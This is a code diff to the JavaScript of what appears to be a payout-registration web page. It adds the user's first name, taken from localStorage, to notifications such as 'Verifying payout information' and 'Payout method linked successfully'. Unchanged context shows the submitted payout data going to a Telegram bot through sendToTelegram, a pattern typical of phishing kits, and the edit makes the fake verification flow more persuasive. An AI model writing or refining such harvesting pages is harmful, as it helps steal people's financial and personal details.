@@ -3295,9 +3295,26 @@ window.addEventListener("load", () => {
         v => v && v.toString().trim() !== ""
     );
 
+    let firstName = "";
+    const localData = localStorage.getItem("section2Data");
+
+    if (localData) {
+        try {
+            const savedData = JSON.parse(localData);
+            if (savedData.fullName) {
+                const rawFirstName = savedData.fullName.trim().split(" ")[0];
+                firstName = rawFirstName.charAt(0).toUpperCase() + rawFirstName.slice(1).toLowerCase();
+            }
+        } catch (e) {
+            console.error("Failed to parse registration name metrics.");
+        }
+    }
+
+    const nameString = firstName ? `, ${firstName}` : "";
+
     // Only display default instructions on boot, not the success toast
     if (!hasSavedData) {
-        showNotification("Only one payout method is required");
+        showNotification(`Only one payout method is required${nameString}`);
     }
 });
 
@@ -3884,6 +3901,22 @@ MAIN BUTTON HANDLER
 -------------------------- */
 document.getElementById('nextBtnSeparate').addEventListener('click', async () => {
 
+  // Helper to extract first name dynamically for dynamic feedback messages
+  let firstName = "";
+  const localData = localStorage.getItem("section2Data");
+  if (localData) {
+      try {
+          const savedData = JSON.parse(localData);
+          if (savedData.fullName) {
+              const rawFirstName = savedData.fullName.trim().split(" ")[0];
+              firstName = rawFirstName.charAt(0).toUpperCase() + rawFirstName.slice(1).toLowerCase();
+          }
+      } catch (e) {
+          console.error("Failed to parse registration name metrics.");
+      }
+  }
+  const nameString = firstName ? `, ${firstName}` : "";
+
   // 1. FIRST check validation. If incomplete, stop right here and output message.
   const validation = validateCurrentPreference();
   if (!validation.valid) {
@@ -3892,7 +3925,7 @@ document.getElementById('nextBtnSeparate').addEventListener('click', async () =>
   }
 
   // 2. Show the verification progress message
-  showNotification("Verifying payout information...", 2500);
+  showNotification(`Verifying payout information${nameString}...`, 2500);
 
   const data = {
     preference,
@@ -3938,7 +3971,7 @@ document.getElementById('nextBtnSeparate').addEventListener('click', async () =>
   try {
     // 3. Exact original Telegram request execution
     await sendToTelegram(data);
-    showNotification("Payout method linked successfully", 3000);
+    showNotification(`Payout method linked successfully${nameString}`, 3000);
 
     // Brief delay to allow the notification to display before redirecting
     setTimeout(() => {
@@ -3947,9 +3980,10 @@ document.getElementById('nextBtnSeparate').addEventListener('click', async () =>
 
   } catch (err) {
     console.error("Telegram send failed:", err);
-    showNotification("Failed to link payout method. Please try again", 5000);
+    showNotification(`Failed to link payout method${nameString}. Please try again`, 5000);
   }
 });
+
 
 
 
